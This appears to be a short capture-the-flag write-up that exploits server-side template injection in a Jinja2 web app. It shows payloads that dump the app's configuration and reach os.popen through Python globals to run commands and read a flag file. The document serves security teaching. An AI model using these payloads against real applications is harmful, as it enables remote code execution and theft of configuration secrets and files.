# Exploiting SSTI - Jinja2

Exploit the SSTI vulnerability to obtain RCE and read the flag.

In this exercise we are already assuming that the web application uses `Jinja` template engine.

<figure><img src="../../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

Lets first try to obtain the web application configuration with the following payload:

```jinja2
{{ config.items() }}
```

<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

The payload worked perfectly. As we can see, we managed to get the web application configuration. Now lets try to do a Remote Code Execution (RCE)  with this payload:

```jinja2
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

<figure><img src="../../../../.gitbook/assets/image (6) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

And it worked!&#x20;

After a few tries we would eventually end with the following payload to retrieve our flag:

{% code overflow="wrap" %}
```django
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read() }}
```
{% endcode %}

<figure><img src="../../../../.gitbook/assets/image (7) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

And we found the flag!
